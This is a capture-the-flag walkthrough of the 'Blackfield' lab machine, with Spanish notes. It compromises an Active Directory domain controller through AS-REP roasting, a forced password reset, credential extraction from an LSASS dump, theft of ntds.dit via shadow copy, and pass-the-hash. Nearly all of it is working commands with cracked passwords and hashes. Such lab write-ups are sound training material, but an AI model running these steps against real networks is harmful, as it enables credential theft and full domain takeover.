### BLACKFIELD

```bash
nmap -p- -sSVC --open --min-rate 5000 10.10.10.192  -Pn -nvvv -oN allPorts
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-01 21:48:24Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windo
```

```bash
crackmapexec smb 10.10.10.192 -u 'guest'  -p '' --rid-brute | grep -i sidtypeuser | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' | grep -vE 'BLACKFIELD*|PC*' > users
Administrator
Guest
krbtgt
DC01$
audit2020
support
svc_backup
lydericlefebvre
SRV-WEB$
SRV-FILE$
SRV-EXCHANGE$
SRV-INTRANET$
```

```bash
impacket-GetNPUsers -no-pass -usersfile users blackfield.local/  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:9a93493d407d12b1d790b4e5236e2edf$1454e56deccd85e830f6aef0144f18953eb4c3abb14d78fca6f62657099382b10f1dad112e1a98c6fc23f483b62148e680f4f36d7fc4be016b966067b9d0195b10243e5cb9ce768aaf3c52713344ad0d5d2a0b60311a1eb316ad7e647eebb2aef61828ef29f1c6703ef38bff44c407d803df6fee7f7f7de6889ec807d253f794d0d3c25332803da5b00dfa40511119dfed6aa72aa9fd39ef2b98d891b5e4a1c8dd1a291ceef7049fd1a1738a0478823b0883b8a51a736217a4dc17779b5ecbc62d0187378891b4d5632e848315e4422cb0e763675c11f70074c4ab63451f18150c306626d213ce8024f76a0850bf7fd60f712855
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-WEB$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-FILE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-EXCHANGE$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SRV-INTRANET$ doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)  
```

```bash
crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'

```

```bash
crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 

```

```bash
ldapsearch -x -H ldap://10.10.10.192 -D "support@blackfield.local" -w '#00^BlackKnight' -b "DC=blackfield,DC=local" "(objectClass=user)" | grep -iE "password|passwd"
NOTHING
```

```bash
bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 --zip
support -> FirstDegreeObjectControl -> ForceChangePassword -> Audit2020
```

```bash
net rpc password audit2020 audit2020 -U 'support%#00^BlackKnight' -S dc01.blackfield.local 
Failed to set password for 'audit2020' with error: Unable to update the password. The value provided for the new password does not meet the length, complexity, or history requirements of the domain..

 net rpc password audit2020 'Audit!123' -U 'support%#00^BlackKnight' -S dc01.blackfield.local

```

```bash
crackmapexec smb 10.10.10.192 -u Audit2020 -p 'Audit!123' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Audit2020:Audit!123 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic  <-------    READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

```bash
smb: \commands_output\> ls
  .                                   D        0  Sun Feb 23 19:14:37 2020
  ..                                  D        0  Sun Feb 23 19:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 14:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 13:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 23:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 13:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 13:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 13:51:01 2020
  route.txt                           A     3976  Sun Feb 23 13:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 13:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 13:54:29 2020

RABBIT HOLE

```

```bash
smb: \memory_analysis\> ls
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
  mmc.zip  
```
**LSASS** (Local Security Authority Subsystem Service) es el proceso de Windows encargado de manejar la **autenticación de usuarios**, **validación de contraseñas**, y **políticas de seguridad** del sistema

```bash
unzip lsass.zip 
Archive:  lsass.zip
  inflating: lsass.DMP 

 file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
 
```

```bash
pypykats lsa minidump lsass.DUMP

```

```bash
Username: Administrator
Domain: BLACKFIELD
LM: NA
NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
crackmapexec smb 10.10.10.192 -u Administrator -H '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'
```

```bash
Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: 9658d1d1dcd9250115e2205d9f48400d
crackmapexec smb 10.10.10.192 -u svc_backup  -H '9658d1d1dcd9250115e2205d9f48400d'  
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
3920bb317a0bef51027e2852be64b543

```

```bash
Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled

```
Podemos hacer DCSYNC pero obtendremos las credenciales y el HashNTLM local del administrador que puede no ser el hash NTLM a nivel de AD simplemente el usado para ese activo por lo tanto buscaremos dumpear el ntds.dit
```bash
 cat test.txt 
set context persistent nowriters 
add volume c: alias priv4te 
create 
expose %priv4te% z: 

```

```bash
upload test.txt
diskshadow.exe /s c:\Temp\test.txt
     %priv4te% = {40b58db1-f568-4d54-a47f-985b32e98f68}
    The shadow copy was successfully exposed as z:\.

```

```bash
*Evil-WinRM* PS C:\Temp> robocopy /b z:\Windows\NTDS\ . ntds.dit
*Evil-WinRM* PS C:\Temp> download ntds.dit

```

```bash
*Evil-WinRM* PS C:\Temp> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> download system

```

```bash
 impacket-secretsdump -system system -ntds ntds.dit local > hashes

 cat hashes | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223

```

```bash
 evil-winrm -i 10.10.10.192 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee' 

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
4375a629c7c67c8e29db269060c955cb

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

